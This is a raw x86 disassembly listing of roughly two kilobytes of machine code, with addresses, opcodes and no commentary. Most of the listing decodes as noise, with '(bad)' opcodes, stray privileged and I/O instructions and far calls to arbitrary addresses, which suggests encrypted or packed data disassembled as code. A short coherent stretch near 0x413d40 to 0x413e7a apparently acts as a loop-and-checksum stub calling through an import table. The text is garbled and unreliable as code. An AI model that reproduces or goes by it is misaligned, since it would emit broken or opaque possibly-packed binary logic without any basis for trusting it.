  41394e:	stos   DWORD PTR es:[edi],eax
  41394f:	push   ebx
  413950:	mov    esp,esp
  413952:	cmp    DWORD PTR [edi+0x1c],edi
  413955:	push   edx
  413956:	mov    ah,bh
  413958:	mov    ds:0x8929b7b2,al
  41395d:	mov    ebx,edx
  41395f:	mov    dh,0xab
  413961:	push   ss
  413962:	rcl    dh,cl
  413964:	cmc    
  413965:	fidiv  DWORD PTR gs:[ecx]
  413968:	inc    ebx
  413969:	arpl   WORD PTR [ebp+ebp*1-0x29],dx
  41396d:	stos   DWORD PTR es:[edi],eax
  41396e:	test   al,0xe2
  413970:	aas    
  413971:	outs   dx,BYTE PTR cs:[esi]
  413973:	xor    BYTE PTR [si-0x49],cl
  413977:	push   cs
  413978:	mov    bl,0xf
  41397a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41397b:	xor    bh,bl
  41397d:	cld    
  41397e:	inc    esi
  41397f:	addr16 (bad) 
  413981:	fdiv   QWORD PTR ds:0x1ef44460
  413987:	outs   dx,DWORD PTR ds:[esi]
  413988:	or     ebp,DWORD PTR [ebx-0x6d8f5283]
  41398e:	in     al,0x67
  413990:	add    DWORD PTR ds:0x448de137,esi
  413996:	jne    0x4139bd
  413998:	popa   
  413999:	jb     0x413a02
  41399b:	mov    ah,BYTE PTR [ebx]
  41399d:	in     eax,0xbd
  41399f:	xchg   edi,eax
  4139a0:	ins    DWORD PTR es:[edi],dx
  4139a1:	push   ds
  4139a2:	mov    ch,0x39
  4139a4:	push   0x5a2ab585
  4139a9:	shr    BYTE PTR [ebx-0x5970b9b8],1
  4139af:	mov    DWORD PTR [esi],eax
  4139b1:	cs fnsetpm(287 only) 
  4139b4:	in     al,0x5c
  4139b6:	rol    BYTE PTR [edx-0x366699f2],0x27
  4139bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139be:	push   ebx
  4139bf:	xchg   esp,eax
  4139c0:	and    eax,0x7bd88e19
  4139c5:	cwde   
  4139c6:	pop    edx
  4139c7:	mov    edx,0xcddce087
  4139cc:	bound  esp,QWORD PTR [esi+0x1d4c4123]
  4139d2:	in     eax,0xf8
  4139d4:	add    cl,ch
  4139d6:	sbb    eax,ebp
  4139d8:	les    esi,FWORD PTR [edi-0x9]
  4139db:	pop    ds
  4139dc:	mov    ch,0xf8
  4139de:	pop    ebx
  4139e0:	unpckhps xmm4,xmm7
  4139e3:	jns    0x413990
  4139e5:	das    
  4139e6:	pushf  
  4139e7:	add    bl,bl
  4139e9:	cwde   
  4139ea:	add    eax,0x8a772b10
  4139ef:	mov    dh,0x84
  4139f1:	cld    
  4139f2:	mov    bh,0x6b
  4139f4:	xor    dl,BYTE PTR [edi+eax*8-0x6806daaa]
  4139fb:	push   ebp
  4139fc:	sub    al,0xb8
  4139fe:	push   esi
  4139ff:	cli    
  413a00:	mov    ch,BYTE PTR [edi-0x3bb6bad8]
  413a06:	adc    esi,DWORD PTR [ebx]
  413a08:	mov    dl,0x24
  413a0a:	xlat   BYTE PTR ds:[ebx]
  413a0b:	and    BYTE PTR [ebx+0x6b],ah
  413a0e:	adc    al,0x63
  413a10:	pop    ebx
  413a11:	ror    DWORD PTR [esi],1
  413a13:	fsubr  QWORD PTR [eax+ebp*4]
  413a16:	sbb    eax,0xea0086d1
  413a1b:	push   ss
  413a1c:	jecxz  0x4139e6
  413a1e:	sub    eax,0xcf297449
  413a23:	and    DWORD PTR [ebx-0x7d],0xe0d4ab8b
  413a2a:	in     eax,0xa7
  413a2c:	xchg   edi,eax
  413a2d:	ror    DWORD PTR [edi+edx*2],0xc1
  413a31:	xchg   edx,eax
  413a32:	fs das 
  413a34:	dec    edx
  413a35:	(bad)  
  413a36:	dec    ebx
  413a37:	push   ss
  413a38:	into   
  413a39:	sub    BYTE PTR ss:[ebp-0x48],ah
  413a3d:	pushf  
  413a3e:	push   esp
  413a3f:	pop    ebp
  413a40:	ret    0xc81c
  413a43:	in     al,0xf2
  413a45:	xlat   BYTE PTR ds:[ebx]
  413a46:	fisttp QWORD PTR [edi]
  413a48:	sub    eax,0x56a83c0f
  413a4d:	cwde   
  413a4e:	push   cs
  413a4f:	imul   eax,DWORD PTR [eax],0xffffffe8
  413a52:	ja     0x413a11
  413a54:	(bad)  
  413a55:	(bad)  
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	dec    ecx
  413a68:	fcom   QWORD PTR [edx+0x70687ed9]
  413a6e:	jo     0x413a29
  413a70:	jle    0x413ae2
  413a72:	jo     0x413ac8
  413a74:	call   0x9f81d228
  413a79:	mov    cl,0xd
  413a7b:	gs stc 
  413a7d:	sbb    dh,BYTE PTR [esp+eax*8]
  413a80:	jle    0x413a98
  413a82:	fistp  WORD PTR [ecx+0x6d11288b]
  413a88:	ins    DWORD PTR es:[edi],dx
  413a89:	lods   eax,DWORD PTR ds:[esi]
  413a8a:	(bad)  
  413a8b:	popa   
  413a8c:	fcmovu st,st(3)
  413a8e:	adc    bl,BYTE PTR [ebx-0x17]
  413a91:	ret    
  413a92:	(bad)  
  413a93:	retf   
  413a94:	push   0x9094430c
  413a99:	sub    bh,BYTE PTR [ecx-0x37]
  413a9c:	fucomp st(2)
  413a9e:	dec    esp
  413a9f:	xchg   edi,eax
  413aa0:	std    
  413aa1:	shl    BYTE PTR [esi],0xd2
  413aa4:	xor    BYTE PTR [edx],bh
  413aa6:	pop    edx
  413aa7:	rcl    BYTE PTR [edx-0x33793b51],1
  413aad:	push   ebp
  413aae:	pusha  
  413aaf:	xor    BYTE PTR [esi-0x22614e65],bl
  413ab5:	cmp    ebp,DWORD PTR [ebp+0x7b15b96e]
  413abb:	iret   
  413abc:	ss xchg esi,eax
  413abe:	mov    esi,esp
  413ac0:	jle    0x413a4c
  413ac2:	(bad)  
  413ac3:	fstp   TBYTE PTR [ebx-0x5553b096]
  413ac9:	adc    bh,BYTE PTR [ecx]
  413acb:	mov    al,ds:0x88341b5a
  413ad0:	lods   eax,DWORD PTR ds:[esi]
  413ad1:	and    al,0x3e
  413ad3:	imul   ebx,DWORD PTR [ebx+0x15],0x3d
  413ad7:	daa    
  413ad8:	sbb    al,0x7e
  413ada:	(bad)
  413adf:	jp     0x413aa6
  413ae1:	pushf  
  413ae2:	scas   eax,DWORD PTR es:[edi]
  413ae3:	or     ch,bl
  413ae5:	and    bh,BYTE PTR [edi+0x451ae7cf]
  413aeb:	int    0xd4
  413aed:	fs (bad) 
  413aef:	cmc    
  413af0:	xchg   edi,eax
  413af1:	loope  0x413a8c
  413af3:	mov    ds:0x30e92e3c,al
  413af8:	ss ins DWORD PTR es:[edi],dx
  413afa:	and    eax,DWORD PTR [ecx]
  413afc:	jns    0x413b28
  413afe:	rol    ebx,0x6b
  413b01:	inc    eax
  413b02:	mov    ebx,0x7cab6734
  413b07:	fwait
  413b08:	or     esp,DWORD PTR [esi+eax*2-0x42]
  413b0c:	mov    ds:0x4dc8ef94,al
  413b11:	sbb    al,0xf
  413b13:	pop    ebx
  413b14:	fwait
  413b15:	dec    ebx
  413b16:	and    BYTE PTR [eax-0x1a],0x7b
  413b1a:	ins    BYTE PTR es:[edi],dx
  413b1b:	pop    ds
  413b1c:	pop    edi
  413b1d:	mov    al,0x35
  413b1f:	mov    WORD PTR [esi],gs
  413b21:	addr16 cmc 
  413b23:	int3   
  413b24:	adc    eax,DWORD PTR [ecx-0x2c]
  413b27:	(bad)  [edx]
  413b29:	xchg   ebp,eax
  413b2a:	adc    dl,cl
  413b2c:	add    al,0xa9
  413b2f:	(bad)  
  413b30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b31:	fadd   st(1),st
  413b33:	(bad)  
  413b34:	sub    DWORD PTR [ebx],ebp
  413b36:	call   0x4bef5db7
  413b3b:	adc    DWORD PTR [ecx],esp
  413b3d:	mov    ecx,0x3ce24008
  413b42:	pop    es
  413b43:	je     0x413b8f
  413b45:	jae    0x413ade
  413b47:	(bad)  
  413b48:	cmp    al,0x27
  413b4a:	mov    esp,0x4a442f75
  413b4f:	ja     0x413b61
  413b51:	xor    bl,BYTE PTR [edi]
  413b53:	jecxz  0x413b71
  413b55:	sbb    BYTE PTR [edx-0x6a],0xc0
  413b59:	adc    esp,esi
  413b5b:	jp     0x413b5a
  413b5d:	adc    al,BYTE PTR [edx]
  413b5f:	jnp    0x413bad
  413b61:	faddp  st(0),st
  413b63:	call   0xe913adf7
  413b68:	mov    WORD PTR [ebx-0x6f],gs
  413b6b:	push   ecx
  413b6c:	inc    ecx
  413b6d:	into   
  413b6e:	mov    BYTE PTR [ebp-0x7b299ecd],cl
  413b74:	in     al,0x31
  413b76:	popa   
  413b77:	xor    BYTE PTR [esi+0x29],0x41
  413b7b:	imul   ebx,DWORD PTR [edx],0xd64c0e48
  413b81:	clc    
  413b82:	inc    ebp
  413b83:	mov    eax,?
  413b85:	jne    0x413b53
  413b87:	jne    0x413bf2
  413b89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b8a:	test   al,0x99
  413b8c:	rol    BYTE PTR [edi+0xc],1
  413b8f:	sahf   
  413b90:	mov    ds:0x2b41c7b,al
  413b95:	test   al,0x27
  413b97:	cmp    DWORD PTR ds:0xebcefcbe,ebp
  413b9d:	and    bl,BYTE PTR [ebx]
  413b9f:	lods   al,BYTE PTR ds:[esi]
  413ba0:	pop    ecx
  413ba1:	mov    bh,0x20
  413ba3:	ds mov edx,0x85d4d085
  413ba9:	scas   al,BYTE PTR es:[edi]
  413baa:	jl     0x413b65
  413bac:	or     BYTE PTR [esp+ebx*4],0x12
  413bb0:	xor    al,0x3a
  413bb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bb3:	inc    esp
  413bb4:	or     esi,edx
  413bb6:	mov    ebp,eax
  413bb8:	loop   0x413bb3
  413bba:	pusha  
  413bbb:	mov    al,ds:0x3b8a05e8
  413bc0:	mov    cl,0x17
  413bc2:	popa   
  413bc3:	shl    BYTE PTR [ecx-0x5],cl
  413bc6:	inc    esi
  413bc7:	and    DWORD PTR [ecx+0x73896f38],ecx
  413bcd:	daa    
  413bce:	div    BYTE PTR [ebp-0x4c71eb5b]
  413bd4:	jle    0x413bd8
  413bd6:	in     eax,0x47
  413bd8:	int3   
  413bd9:	inc    ebp
  413bda:	xor    esi,esi
  413bdc:	dec    esp
  413bdd:	jle    0x413c27
  413bdf:	mov    DWORD PTR [ebp-0x7c],esp
  413be2:	adc    eax,0x79de8062
  413be7:	inc    esi
  413be8:	bound  eax,QWORD PTR [eax]
  413bea:	ss jnp 0x413c1e
  413bed:	xor    DWORD PTR [ebp+0x79],edi
  413bf0:	mov    esp,0x5f683e4
  413bf5:	rcl    DWORD PTR [edx+0x5],cl
  413bf8:	les    eax,FWORD PTR [ebp-0x6a9e743c]
  413bfe:	jmp    0x413c7f
  413c00:	pop    ebx
  413c01:	or     eax,DWORD PTR [eax]
  413c03:	mov    al,BYTE PTR [eax]
  413c05:	icebp  
  413c06:	ret    0x9f4c
  413c09:	mov    dh,0xad
  413c0b:	dec    ecx
  413c0c:	aad    0xf
  413c0e:	inc    ebp
  413c0f:	mov    WORD PTR [ebx],ds
  413c11:	adc    dl,BYTE PTR [edi]
  413c13:	or     cl,bh
  413c15:	je     0x413c8d
  413c17:	pop    ecx
  413c18:	xor    dl,cl
  413c1a:	or     al,0x6a
  413c1c:	clc    
  413c1d:	cld    
  413c1e:	or     cl,BYTE PTR [eax+0x52]
  413c21:	mov    eax,0x46c0afe7
  413c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c27:	mov    cl,0x19
  413c29:	data16 jne 0x413c3b
  413c2c:	(bad)  
  413c2d:	push   0x7a
  413c2f:	sub    DWORD PTR [ecx],edx
  413c31:	sub    eax,0x8a2e888c
  413c36:	cld    
  413c37:	data16 mov al,0x1b
  413c3a:	pop    ss
  413c3b:	push   ds
  413c3c:	cmc    
  413c3d:	pop    ss
  413c3e:	mov    ebp,0xc26e793e
  413c43:	xchg   esi,eax
  413c44:	mov    eax,0x1d5b920a
  413c49:	add    cl,dh
  413c4b:	jno    0x413c04
  413c4d:	data16 pop ax
  413c50:	adc    eax,0x5c9aeb9e
  413c55:	mov    ecx,0xb3f07c70
  413c5a:	int3   
  413c5b:	inc    esi
  413c5c:	sub    BYTE PTR [esi+eiz*1+0x32],dl
  413c60:	and    al,BYTE PTR ds:[edi+0x71c0f54]
  413c67:	sbb    eax,0xbde3e756
  413c6c:	fidiv  DWORD PTR [esi-0x6c]
  413c6f:	cli    
  413c70:	hlt    
  413c71:	mov    al,ds:0xa74c47aa
  413c76:	movhps QWORD PTR [edx-0x1dcca424],xmm4
  413c7d:	ds gs mov esi,0x2885adef
  413c84:	cmp    BYTE PTR [eax-0x4b],al
  413c87:	add    BYTE PTR [esp+edx*1+0x6fd59ead],0xa0
  413c8f:	adc    DWORD PTR [eax-0x60],ebx
  413c92:	loope  0x413c90
  413c94:	or     BYTE PTR [edx+0x2c8bd4a4],bl
  413c9a:	je     0x413c2a
  413c9c:	mov    eax,0xdf05835
  413ca1:	mov    ds:0xdce3ceb2,eax
  413ca6:	mov    eax,ds:0xb70a61d4
  413cab:	lahf   
  413cac:	xchg   ebx,eax
  413cad:	jne    0x413ce1
  413caf:	dec    ecx
  413cb0:	pop    ebp
  413cb1:	mov    cl,0x6c
  413cb3:	sbb    ebx,esi
  413cb5:	jo     0x413c4a
  413cb7:	or     BYTE PTR [ecx],dl
  413cb9:	push   edx
  413cba:	push   edi
  413cbb:	or     ch,bl
  413cbd:	inc    esi
  413cbe:	test   DWORD PTR [esi+0x334eb709],esp
  413cc4:	(bad)  
  413cc5:	das    
  413cc6:	fs out dx,eax
  413cc8:	xchg   ecx,eax
  413cc9:	jbe    0x413c50
  413ccb:	or     DWORD PTR [eax-0x435cd72c],edx
  413cd1:	neg    BYTE PTR [ecx+0x4d]
  413cd4:	inc    eax
  413cd5:	xlat   BYTE PTR ds:[ebx]
  413cd6:	sbb    BYTE PTR [ecx-0x6a0c3cea],0x68
  413cdd:	data16 adc BYTE PTR [ebx-0x6ae4f30e],dh
  413ce4:	mov    ds:0xb6ac9ead,eax
  413ce9:	call   0xfc88:0x19f4803
  413cf0:	lods   eax,DWORD PTR ds:[esi]
  413cf1:	cmp    esi,edx
  413cf3:	push   es
  413cf4:	lock stos BYTE PTR es:[edi],al
  413cf6:	sti    
  413cf7:	pop    esi
  413cf8:	jne    0x413ccd
  413cfa:	cdq    
  413cfb:	in     al,dx
  413cfc:	mov    ds:0x6494109b,al
  413d01:	push   esp
  413d02:	hlt    
  413d03:	out    dx,eax
  413d04:	dec    ebx
  413d05:	mov    ds:0xce9b155,eax
  413d0a:	fiadd  WORD PTR [ebp-0x1ac0024]
  413d10:	in     al,dx
  413d11:	jo     0x413cc9
  413d13:	inc    edi
  413d14:	es jge 0x413d5b
  413d17:	and    DWORD PTR [ecx+0x2b],ebp
  413d1a:	popa   
  413d1b:	ins    DWORD PTR es:[edi],dx
  413d1c:	pusha  
  413d1d:	ja     0x413d0c
  413d1f:	mov    esp,0x93f3cbb4
  413d24:	(bad)  
  413d25:	sbb    al,0xfb
  413d27:	mov    eax,ds:0xa0028e72
  413d2c:	dec    edi
  413d2d:	mov    esi,0x4e78a710
  413d32:	pop    ds
  413d33:	not    DWORD PTR [edx+0x8]
  413d36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d37:	add    ecx,edi
  413d39:	mov    dl,0x89
  413d3b:	inc    ebp
  413d3c:	loopne 0x413cc9
  413d3e:	inc    ebp
  413d3f:	cld    
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e6ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e6ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e6ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e56b
  413d7f:	cmp    DWORD PTR ds:0x42e6ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e6ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e6ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e6ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e6ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e70f,0x42fd86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e12c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e6f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fcd9,0x42e120
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e6fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e6fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e6fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e6fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e6fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e48b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e6f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fd8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e703
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e11c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e6fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	pop    DWORD PTR [esi+0x475fe2f0]
  413e90:	jbe    0x413f02
  413e92:	jo     0x413e4d
  413e94:	jle    0x413f06
  413e96:	jo     0x413e3c
  413e98:	or     DWORD PTR [eax-0x19],esi
  413e9b:	pop    ss
  413e9c:	push   esp
  413e9d:	les    esi,FWORD PTR [edx+0x40da8279]
  413ea3:	hlt    
  413ea4:	fist   WORD PTR [esi-0x4]
  413ea7:	mov    ch,0x8c
  413ea9:	sbb    BYTE PTR [ecx],bh
  413eab:	clc    
  413eac:	imul   esp,edi,0xfffffffb
  413eaf:	sahf   
  413eb0:	and    eax,DWORD PTR [esi]
  413eb2:	jbe    0x413ee9
  413eb4:	jns    0x413e7b
  413eb6:	mov    esi,DWORD PTR [eax+eax*2+0x5bf8ffc4]
  413ebd:	fmul   DWORD PTR [ebx+ecx*1+0x3f8ef332]
  413ec4:	mov    edx,0x28ffb24e
  413ec9:	lods   eax,DWORD PTR ds:[esi]
  413eca:	(bad)  [edx]
  413ecc:	ins    DWORD PTR es:[edi],dx
  413ecd:	and    BYTE PTR [esi-0x52],ah
  413ed0:	jnp    0x413ee9
  413ed2:	xchg   ecx,eax
  413ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ed4:	push   esi
  413ed5:	mov    esi,esi
  413ed7:	jecxz  0x413ef5
  413ed9:	stos   BYTE PTR es:[edi],al
  413eda:	fmul   QWORD PTR [edi]
  413edc:	adc    DWORD PTR [ecx],ebx
  413ede:	es jbe 0x413f1a
  413ee1:	push   es
  413ee2:	sahf   
  413ee3:	add    dl,dl
  413ee5:	dec    edx
  413ee6:	adc    al,0xb0
  413ee8:	xchg   DWORD PTR [ebp-0x79],ecx
  413eeb:	adc    BYTE PTR [eax],cl
  413eed:	and    al,0x24
  413eef:	and    DWORD PTR [eax+edi*2+0x32b2c078],ecx
  413ef6:	mov    edx,0xc95dbf98
  413efb:	rcr    BYTE PTR [edx+0x63],0xdc
  413eff:	inc    ebx
  413f00:	fsub   st,st(2)
  413f02:	push   ebp
  413f03:	sbb    BYTE PTR [ecx-0x74043c6f],0x95
  413f0a:	ret    0x497f
  413f0d:	repnz cli 
  413f0f:	jmp    0x413f75
  413f11:	lds    eax,FWORD PTR [ebx+0x3c]
  413f14:	iret   
  413f15:	mov    dl,0xdd
  413f17:	xchg   ebx,eax
  413f18:	test   BYTE PTR [edi+esi*2-0x19],bl
  413f1c:	add    eax,0x92b9073c
  413f21:	mov    al,0xb4
  413f23:	inc    esp
  413f24:	in     al,0xf4
  413f26:	mov    eax,0x6367f2b1
  413f2b:	pop    edx
  413f2c:	es mov esi,0x240bf0a5
  413f32:	fcmovbe st,st(5)
  413f34:	cs cld 
  413f36:	push   ds
  413f37:	fcmovnb st,st(7)
  413f39:	inc    esp
  413f3a:	(bad)  
  413f3b:	retf   
  413f3c:	xor    al,0xc2
  413f3e:	jb     0x413f3c
  413f40:	les    esi,FWORD PTR [ecx-0x65]
  413f43:	xor    al,0xb8
  413f45:	push   ss
  413f46:	in     al,dx
  413f47:	push   edi
  413f48:	adc    BYTE PTR [ebx-0x5a],dh
  413f4b:	pop    esp
  413f4c:	dec    esp
  413f4d:	daa    
  413f4e:	lods   eax,DWORD PTR ds:[esi]
  413f4f:	push   0xffffffae
  413f51:	dec    esi
  413f52:	ret    0x1f8c
  413f55:	rep lods eax,DWORD PTR ds:[esi]
  413f57:	fst    DWORD PTR [ecx+0x1]
  413f5a:	adc    al,0xb
  413f5c:	fisttp WORD PTR [ebx+ebx*2+0x16]
  413f60:	xchg   esi,eax
  413f61:	sub    DWORD PTR [eax+esi*2+0x47],ebx
  413f65:	sbb    al,0xd7
  413f67:	mov    eax,0xd025462
  413f6c:	pop    esp
  413f6d:	test   BYTE PTR [esi-0x56],bh
  413f70:	enter  0xe716,0xed
  413f74:	and    edi,DWORD PTR [eax+0x1606060f]
  413f7a:	daa    
  413f7b:	mov    esi,0x8c3ceec8
  413f80:	loopne 0x413f1f
  413f82:	leave  
  413f83:	push   ds
  413f84:	out    dx,eax
  413f85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f86:	inc    BYTE PTR [edx]
  413f88:	(bad)  
  413f8a:	sbb    al,0x12
  413f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f8d:	loopne 0x413f3d
  413f8f:	jno    0x413fc4
  413f91:	push   0x2e
  413f93:	(bad)
  413f98:	es and eax,0xc5d0eb85
  413f9e:	jae    0x413fef
  413fa0:	(bad)  
  413fa1:	jbe    0x413f49
  413fa3:	lods   eax,DWORD PTR ds:[esi]
  413fa4:	popf   
  413fa5:	or     esp,eax
  413fa7:	data16 sahf 
  413fa9:	mov    ebp,0xad9ed3fa
  413fae:	xchg   ebx,eax
  413faf:	arpl   WORD PTR [ecx],sp
  413fb1:	add    DWORD PTR [edx-0xb],esp
  413fb4:	fdiv   st(3),st
  413fb6:	xchg   edi,eax
  413fb7:	das    
  413fb8:	addr16 dec edi
  413fba:	das    
  413fbb:	icebp  
  413fbc:	push   es
  413fbd:	fiadd  DWORD PTR [edi]
  413fbf:	jnp    0x414021
  413fc1:	push   eax
  413fc2:	xlat   BYTE PTR ds:[ebx]
  413fc3:	mov    ecx,edi
  413fc5:	xor    eax,0x3e7ae4d6
  413fca:	aaa    
  413fcb:	cmp    dl,al
  413fcd:	les    ebx,FWORD PTR [edi]
  413fcf:	mov    DWORD PTR [edx+eax*4-0x3d2e1222],esp
  413fd6:	ins    BYTE PTR es:[edi],dx
  413fd7:	pop    ss
  413fd8:	loope  0x413f78
  413fda:	js     0x413fe3
  413fdc:	mov    bl,0x8
  413fde:	mov    eax,0x70e99f3c
  413fe3:	cs jg  0x413fe1
  413fe6:	jns    0x413f69
  413fe8:	mov    ah,BYTE PTR [eax]
  413fea:	retf   0xffcf
  413fed:	jle    0x413f8d
  413fef:	xor    DWORD PTR [edi+0x38d3eb71],0x16258f30
  413ff9:	ds jae 0x41403b
  413ffc:	ror    BYTE PTR [ebp+eax*2-0x1c],0x85
  414001:	xchg   ebp,eax
  414002:	dec    ebx
  414003:	mov    cl,0xa4
  414005:	cmp    dh,BYTE PTR ss:[ecx+0x6e]
  414009:	sti    
  41400a:	mov    dh,0xdd
  41400c:	jo     0x41405d
  41400e:	test   BYTE PTR [ebp-0x59a98f4c],al
  414014:	adc    dl,bl
  414016:	cld    
  414017:	int    0x3c
  414019:	ret    
  41401a:	or     eax,0xb0dc1b62
  41401f:	and    BYTE PTR [ebx],dl
  414021:	leave  
  414022:	lods   eax,DWORD PTR ds:[esi]
  414023:	sub    BYTE PTR [esi-0x51],0xe1
  414027:	mov    ecx,0x613d8ab3
  41402c:	fsincos 
  41402e:	jno    0x413fec
  414030:	sub    al,BYTE PTR [eax+0x4ec09723]
  414036:	or     edi,0x67
  414039:	retf   
  41403a:	dec    ebx
  41403b:	clc    
  41403c:	(bad)  
  41403d:	ja     0x413fd2
  41403f:	pop    esp
  414040:	adc    DWORD PTR [ebx],esi
  414042:	sub    esp,DWORD PTR [edi+0x32]
  414045:	nop
  414046:	inc    ecx
  414047:	in     al,dx
  414048:	xchg   ebx,eax
  414049:	and    al,0xb8
  41404b:	pushf  
  41404c:	pop    ss
  41404d:	push   ss
  41404e:	in     al,dx
  41404f:	inc    edx
  414050:	sar    BYTE PTR [ecx+edx*2],0x47
  414054:	push   ds
  414055:	out    0xee,al
  414057:	or     DWORD PTR [edx-0x31cd90da],ebp
  41405d:	dec    edi
  41405e:	dec    esi
  41405f:	dec    ecx
  414060:	sbb    eax,0x3742b157
  414065:	sbb    eax,0xfffffff1
  414068:	stc    
  414069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41406a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41406b:	cmp    eax,0x8e3e2fed
  414070:	adc    ah,BYTE PTR [eax-0x31e777ac]
  414076:	call   0x72298c2a
  41407b:	lock xchg esi,eax
  41407d:	mov    WORD PTR [eax],?
  41407f:	dec    edx
  414080:	std    
  414081:	push   es
  414082:	push   0xffffffd0
  414084:	jg     0x414088
  414086:	call   0xf290175c
  41408b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41408c:	aad    0x72
  41408e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41408f:	ins    DWORD PTR es:[edi],dx
  414090:	out    0x3c,al
  414092:	retf   0x1ead
  414095:	dec    esi
  414096:	scas   al,BYTE PTR es:[edi]
  414097:	call   0xa9bf8847
  41409c:	mov    al,0xbf
  41409e:	ja     0x41411a
  4140a0:	jmp    0xc9d2:0xdd11c7a9
  4140a7:	out    0xc,al
  4140a9:	mov    DWORD PTR [esi-0x1e2b431d],eax
  4140af:	pop    ss
  4140b0:	sub    ebp,DWORD PTR [esi+0x6e]
  4140b3:	jmp    0x414115
  4140b5:	adc    bl,bl
  4140b7:	int    0xc6
  4140b9:	mov    ebx,0x94b7c9eb
  4140be:	pop    edx
  4140bf:	imul   edx,DWORD PTR [esi],0xfffffff9
  4140c2:	stos   DWORD PTR es:[edi],eax
  4140c3:	push   es
  4140c4:	aaa    
  4140c5:	fidiv  WORD PTR [ebx-0x554dab64]
  4140cb:	mov    ebx,0x316a5437
  4140d0:	out    dx,al
  4140d1:	dec    edi
  4140d2:	ins    DWORD PTR es:[edi],dx
  4140d3:	imul   DWORD PTR [edi+0x6e184400]
  4140d9:	lahf   
  4140da:	cs daa 
  4140dc:	xor    DWORD PTR [eax+0x35fb3110],edi
  4140e2:	mov    esi,0x26d29c90
  4140e7:	mov    ds:0xd97450c6,eax
  4140ec:	(bad)  
  4140ed:	shl    BYTE PTR [esp+esi*1+0x8],cl
  4140f1:	adc    BYTE PTR [edx-0x64],bl
  4140f4:	push   ecx
  4140f5:	inc    esi
  4140f6:	xor    DWORD PTR [esi+0x74ff5f25],eax
  4140fc:	bndldx (bad),[esi-0xec690f]
  414103:	cli    
  414104:	jnp    0x4140e9
  414106:	jae    0x4140bd
  414108:	add    ah,BYTE PTR [eax]
  41410a:	lock mov bl,0x19
  41410d:	push   ss
  41410e:	clc    
  41410f:	fcomp  QWORD PTR [edx-0x67]
  414112:	sbb    DWORD PTR ss:[eax+0x7],ebp
  414116:	pop    ecx
  414117:	test   DWORD PTR [ebp-0x7c],0x6a6c4e26
  41411e:	or     eax,0xe250c78f
  414123:	mov    esi,fs
  414125:	fndisi(8087 only) 
  414127:	iret   
  414128:	mov    ah,0xd5
  41412a:	into   
  41412b:	mov    ecx,0xfdbc221b
  414130:	sub    BYTE PTR [eax-0x63],dh
  414133:	sbb    eax,0x64accc67
  414138:	aam    0x49
  41413a:	mul    BYTE PTR [ecx-0x8]
